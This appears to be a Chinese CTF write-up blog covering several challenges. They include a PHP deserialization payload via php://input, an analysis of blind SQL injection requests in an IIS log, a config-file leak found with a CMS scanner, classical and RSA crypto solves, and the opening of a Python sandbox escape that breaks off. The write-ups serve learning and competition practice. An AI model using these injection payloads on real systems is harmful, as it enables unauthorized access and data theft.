class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/web/theuserisadmin/?file=class.php&amp;user=php://input&amp;pass=O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;</span><br><span class="line"></span><br><span class="line">post:the user is admin</span><br><span class="line">    </span><br><span class="line"><span class="comment">//flag&#123;078d8dd8023d5716a11780adf344dfd2&#125;</span></span><br></pre></td></tr></table></figure><h1 id="ccgs"><a href="#ccgs" class="headerlink" title="ccgs"></a>ccgs</h1><p><img src="1537109403700.png" alt="1537109403700"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e sgcc.png</span><br><span class="line">cat secret.txt | base64 -d | base64 -d &gt; final.png</span><br></pre></td></tr></table></figure><p><img src="1537070199581.png" alt="1537070199581"></p><h1 id="注入日志分析"><a href="#注入日志分析" class="headerlink" title="注入日志分析"></a>注入日志分析</h1><p>给了一个日志文件，<code>file data.log</code>得到是一个文本文件，直接打开，前几行是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#Software: Microsoft Internet Information Services 6.0</span><br><span class="line">#Version: 1.0</span><br><span class="line">#Date: 2015-10-21 09:16:34</span><br></pre></td></tr></table></figure><p>猜测是IIS服务器记录的流量日志， 分析前几行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET /index.htm - 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 200 0 0</span><br><span class="line">2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET /favicon.ico - 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 404 0 2</span><br><span class="line">2015-10-21 09:16:36 W3SVC1 192.168.1.135 GET /show.asp id=2 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 200 0 0</span><br><span class="line">2015-10-21 09:25:01 W3SVC1 192.168.1.135 GET /show.asp id=2%27|17|80040e14|字符串_&apos;&apos;_之前有未闭合的引号。 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 500 0 0</span><br></pre></td></tr></table></figure><p>可以看到就是一条条的HTTP请求，并且后面跟着状态码。继续浏览，看到<code>id</code>字段出现一些<code>SQL</code>的关键字，那么可以想到这记录的就是<code>sqlmap</code>(或许)的注入流量分析。思路就是找到关键的注入请求，文件很大，我们可以搜索<code>flag</code>试试，找到关键的请求如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E51|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以利用文本编辑器如<code>sublime text 3</code>的<code>ctrl+H</code>的替换功能， 将关键流量进行精简并<code>urldecode</code>利于分析(截取两个代表性请求)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))&gt;51|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 500 0 0</span><br><span class="line">id=2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))&gt;48 80 200 0 0</span><br></pre></td></tr></table></figure><p>可以看到这里是二分法盲注的HTTP请求，现在思路很明确了， 从<code>SUBSTRING(.*, 1, 1)</code>开始找，并且只要看最后几条的注入请求就可以判断出字符是多少。 比如<code>SUBSTRING(.*, 1, 1) &gt; 48</code>的状态码是<code>200</code>，<code>SUBSTRING(.*, 1, 1) &gt; 49</code>的状态码是<code>500</code>，那其实就可以确定字符的ascii码是49。就这样就能得到<code>theflag</code>的值。</p><h1 id="brightstar"><a href="#brightstar" class="headerlink" title="brightstar"></a>brightstar</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/classical/others/#_9" target="_blank" rel="noopener">列移位密码</a> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">snkeegt fhstetr Iedsabs tnaktrt otessha iiriwis tethees</span><br><span class="line">key： howarey</span><br><span class="line">Columnar Transposition Cipher</span><br></pre></td></tr></table></figure><table><thead><tr><th>h</th><th>o</th><th>w</th><th>a</th><th>r</th><th>e</th><th>y</th></tr></thead><tbody><tr><td>3</td><td>4</td><td>6</td><td>1</td><td>5</td><td>2</td><td>7</td></tr><tr><td>I</td><td>t</td><td>i</td><td>s</td><td>o</td><td>f</td><td>t</td></tr><tr><td>e</td><td>n</td><td>i</td><td>n</td><td>t</td><td>h</td><td>e</td></tr><tr><td>d</td><td>a</td><td>r</td><td>k</td><td>e</td><td>s</td><td>t</td></tr><tr><td>s</td><td>k</td><td>i</td><td>e</td><td>s</td><td>t</td><td>h</td></tr><tr><td>a</td><td>t</td><td>w</td><td>e</td><td>s</td><td>e</td><td>e</td></tr><tr><td>b</td><td>r</td><td>i</td><td>g</td><td>h</td><td>t</td><td>e</td></tr><tr><td>s</td><td>t</td><td>s</td><td>t</td><td>a</td><td>r</td><td>s</td></tr></tbody></table><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="string">'snkeegt fhstetr Iedsabs tnaktrt otessha iiriwis tethees'</span>.split(<span class="string">' '</span>)</span><br><span class="line">k=<span class="string">'howarey'</span></span><br><span class="line">kk=sorted(k)</span><br><span class="line">print(<span class="string">''</span>.join(c[kk.index(j)][i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(k)) <span class="keyword">for</span> j <span class="keyword">in</span> k))</span><br><span class="line"><span class="comment"># Itisofteninthedarkestskiesthatweseebrighteststars</span></span><br></pre></td></tr></table></figure><h1 id="这是啥呀"><a href="#这是啥呀" class="headerlink" title="这是啥呀"></a>这是啥呀</h1><p>base32编码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo MZWGCZ33MM4GENJVHBRDSNJUGAYTSOBVGZTDAYRQGIZTINLEMMZTSNJVHBRX2=== | base32 -d</span><br><span class="line"><span class="meta">#</span><span class="bash">flag&#123;c8b558b954019856f0b02345dc39558c&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Windows逆向"><a href="#Windows逆向" class="headerlink" title="Windows逆向"></a>Windows逆向</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s=&apos;sKfxEeft&#125;f&#123;gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\0087138&apos;</span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">idx=[1,4,14,10,5,36,23,42,13,19,28,13,27,39,48,41,42]</span><br><span class="line">for i in idx:</span><br><span class="line">     flag+=s[i]</span><br><span class="line">print(flag)</span><br><span class="line"># KEY&#123;e2s6ry3r5s8f6</span><br></pre></td></tr></table></figure><p>得到部分flag，加上1024}得到完整flag：KEY{e2s6ry3r5s8f61024}</p><h1 id="reverseme"><a href="#reverseme" class="headerlink" title="reverseme"></a>reverseme</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"open('file.png','wb').write(open('reverseme','rb').read()[::-1])"</span></span><br><span class="line">或</span><br><span class="line">&lt;reverseme xxd -p -c1 | tac | xxd -p -r &gt;file.png</span><br></pre></td></tr></table></figure><p><img src="1537420090085.png" alt="1537420090085"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert -flop file.png mirror_file.png</span><br></pre></td></tr></table></figure><p><img src="1537420103233.png" alt="1537420103233"></p><h1 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h1><p><a href="https://github.com/Tuhinshubhra/CMSeeK" target="_blank" rel="noopener">CMSeeK</a> 扫出配置文件 <a href="http://192.168.200.202//configuration.php.txt" target="_blank" rel="noopener">http://192.168.200.202//configuration.php.txt</a> </p><p>底部有flag: <code>flag{0b58f603ff55c0c190502b44b4ffbf2c}</code>  </p><p>此外一些没进一步利用上的信息和部分题目的附件放在<a href="https://github.com/findneo/ctfgodown/blob/master/20180916heidun/" target="_blank" rel="noopener">GiIthub</a> ，有兴趣可移步查看。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>胖哈勃之 LHY</title>
      <link href="/180903-pwnhub-lhy/"/>
      <url>/180903-pwnhub-lhy/</url>
      
        <content type="html"><![CDATA[<h1 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> x, y, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> gmpy.is_prime(y) ** <span class="number">2016</span> + gmpy.is_prime(x+<span class="number">1</span>) ** <span class="number">2017</span> + ((x**<span class="number">2</span> - <span class="number">1</span>)**<span class="number">2</span> % (<span class="number">2</span>*x*y - <span class="number">1</span>) + <span class="number">2</span>) ** <span class="number">2018</span> == <span class="number">30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146</span></span><br><span class="line"></span><br><span class="line">p = gmpy.next_prime(x**<span class="number">3</span> + y**<span class="number">3</span>) <span class="comment">#(x+y)**3-3xy(x+y)</span></span><br><span class="line">q = gmpy.next_prime(x**<span class="number">2</span>*y + y**<span class="number">2</span>*x) <span class="comment">#xy(x+y)</span></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy.invert(<span class="number">0x10001</span>, phi)</span><br><span class="line">enc = pow(bytes_to_long(flag), <span class="number">0x10001</span>, n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'n ='</span>, n</span><br><span class="line"><span class="keyword">print</span> <span class="string">'enc ='</span>, enc</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741</span></span><br><span class="line"><span class="comment"># enc = 73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612</span></span><br></pre></td></tr></table></figure><h1 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h1><p>由于</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">2</span>**<span class="number">2018</span> == <span class="number">30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146</span></span><br></pre></td></tr></table></figure><p>所以 <code>x+1</code>和 <code>y</code> 都是质数，<code>(x**2 - 1)**2 % (2*x*y - 1)==0</code> 。</p><p>根据数学推理或者大胆瞎猜得到 <code>x=2y</code> ，然后代入生成p和q，以<code>pq==n</code> 为条件爆破y即可。</p><p>来自 <a href="https://mp.weixin.qq.com/s/3qvuVd9tBK3J-Q9vBMGxwA" target="_blank" rel="noopener">官方WP</a> 的解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show that if 4ab - 1 divides (4a**2 - 1)**2, then a = b.</span></span><br><span class="line"><span class="comment"># suppose y be a large prime and x + 1 is another large prime.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># from this condition with help of previous fact we can deduce that:</span></span><br><span class="line"><span class="comment"># ==&gt; we take 2a = x and b = y, so: 2xy - 1 | (x**2 - 1)**2 ==&gt; x = 2y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># assert gmpy.is_prime(y) + gmpy.is_prime(x+1) + ((x**2 - 1)**2 % (2*x*y - 1) + 2) ** 2018 == 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 = 1 + 1 + 2 ** 2018</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># so we have x = 2y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = gmpy.next_prime(x**3 + y**3) # ==&gt; p = gmpy.next_prime(8*y**3 + y**3) = gmpy.next_prime(9*y**3)</span></span><br><span class="line"><span class="comment"># q = gmpy.next_prime(x**2*y + y**2*x) # ==&gt; q = gmpy.next_prime(4*y**2*y + y**2*(2y)) = gmpy.next_prime(6*y**3)</span></span><br><span class="line"><span class="comment"># n = p * q # ==&gt; n = p * q ~= (9*y**3) * (6*y**3) = 54*y**6</span></span><br><span class="line"><span class="comment"># So we can factor n with knowing n ~= 54*y**6</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741</span></span><br><span class="line">enc = <span class="number">73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now we calculate the 5th root of n//45 to find the y:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iroot</span><span class="params">(k, n)</span>:</span></span><br><span class="line">   UB = <span class="number">1</span></span><br><span class="line">   <span class="keyword">while</span> pow(UB, k) &lt; n:</span><br><span class="line">       UB *= <span class="number">2</span></span><br><span class="line">   LB = UB / <span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span> UB - LB &gt; <span class="number">1</span>:</span><br><span class="line">       M = (LB + UB) // <span class="number">2</span></span><br><span class="line">       midToK = pow(M, k)</span><br><span class="line">       <span class="keyword">if</span> midToK &lt; n:</span><br><span class="line">           LB = M</span><br><span class="line">       <span class="keyword">elif</span> n &lt; midToK:</span><br><span class="line">           UB = M</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">return</span> M</span><br><span class="line">   <span class="keyword">if</span> pow(UB, k) == n:</span><br><span class="line">       <span class="keyword">return</span> UB</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> LB</span><br><span class="line"></span><br><span class="line">y = iroot(<span class="number">6</span>, n // <span class="number">54</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">   <span class="keyword">if</span> gmpy.is_prime(y):</span><br><span class="line">       <span class="keyword">if</span> gmpy.next_prime(<span class="number">9</span>*y**<span class="number">3</span>) * gmpy.next_prime(<span class="number">6</span>*y**<span class="number">3</span>) == n:</span><br><span class="line">           <span class="keyword">print</span> <span class="string">'Found:'</span>, <span class="string">'y ='</span>, y</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       y += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">2</span>*y</span><br><span class="line">p = gmpy.next_prime(x**<span class="number">3</span> + y**<span class="number">3</span>)</span><br><span class="line">q = gmpy.next_prime(x**<span class="number">2</span>*y + y**<span class="number">2</span>*x)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy.invert(<span class="number">0x10001</span>, phi)</span><br><span class="line">flag = long_to_bytes(pow(enc, d, n))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag ='</span>, flag</span><br></pre></td></tr></table></figure><p>没有gmpy库，稍微改了下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741</span></span><br><span class="line">enc = <span class="number">73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612</span></span><br><span class="line">y = gmpy2.iroot( n // <span class="number">54</span>,<span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"near:"</span>,y</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10000</span>):</span><br><span class="line">  k=y+i</span><br><span class="line">  <span class="keyword">if</span> gmpy2.is_prime(k):</span><br><span class="line">    <span class="keyword">if</span> gmpy2.next_prime(<span class="number">9</span>*y**<span class="number">3</span>) * gmpy2.next_prime(<span class="number">6</span>*y**<span class="number">3</span>) == n:</span><br><span class="line">      <span class="keyword">print</span> <span class="string">'Found: offset=%d y=%d'</span>%(i,k)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">x ,y= <span class="number">2</span>*k,k</span><br><span class="line">p = gmpy2.next_prime(x**<span class="number">3</span> + y**<span class="number">3</span>)</span><br><span class="line">q = gmpy2.next_prime(x**<span class="number">2</span>*y + y**<span class="number">2</span>*x)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(<span class="number">0x10001</span>, phi)</span><br><span class="line">flag = long_to_bytes(pow(enc, d, n))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag ='</span>, flag</span><br><span class="line"><span class="comment"># near: 12996881452793504643693526905573881980920361170852213106754463438614382317225798822548048130268953176983864771790449810537027331620960357639880338702048953</span></span><br><span class="line"><span class="comment"># Found: offset=0 y=12996881452793504643693526905573881980920361170852213106754463438614382317225798822548048130268953176983864771790449810537027331620960357639880338702048953</span></span><br><span class="line"><span class="comment"># flag = flag&#123;e01c9eb8078ea9bbac035ea68021c070&#125;</span></span><br></pre></td></tr></table></figure><p>队友Mads推出<code>x=2y</code> 了，可惜没进一步试下。他在博客写了 <a href="https://madsome.one/2018/09/03/%E8%83%96%E5%93%88%E5%8B%83%E4%B8%80%E9%81%93RSA/" target="_blank" rel="noopener">推理过程</a> ，可能不太严谨，但巧妙假设变量关系来消元的思路值得学习。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>TJCTF2018：Mirror Mirror——一种绕过Python沙箱字符限制的方法</title>
      <link href="/180814-python-jail-escape/"/>
      <url>/180814-python-jail-escape/</url>
      
        <content type="html"><![CDATA[<p><img src="1534248479004.png" alt="1534248479004"></p><p>通过nc连接<code>problem1.tjctf.org:8004</code> ,题目提供一个Python交互终端。</p><p>根据题目描述 Reflection 可知与Python反射机制有关。</p><p>所谓反射机制就是能够通过向函数传入字符串参数，来操纵指定对象的类型、属性、方法和类。</p><blockquote><p>A Python script can find out about the type, class, attributes and methods of an object. This is referred to as <strong>reflection</strong> or <strong>introspection</strong>. See also <a href="https://en.wikibooks.org/wiki/Python_Programming/Metaclasses" target="_blank" rel="noopener">Metaclasses</a>.</p><p>Reflection-enabling functions include type(), isinstance(), callable(), dir() and getattr().</p><p>—— <a href="https://en.wikibooks.org/wiki/Python_Programming/Reflection" target="_blank" rel="noopener">https://en.wikibooks.org/wiki/Python_Programming/Reflection</a> </p></blockquote><p>这里使用<code>dir()</code> 函数查看<code>get_flag</code> 的属性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">λ nc problem1.tjctf.org <span class="number">8004</span></span><br><span class="line">Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;console&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: get_flag() takes exactly <span class="number">1</span> argument (<span class="number">0</span> given)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag(<span class="string">'1'</span>)</span><br><span class="line"><span 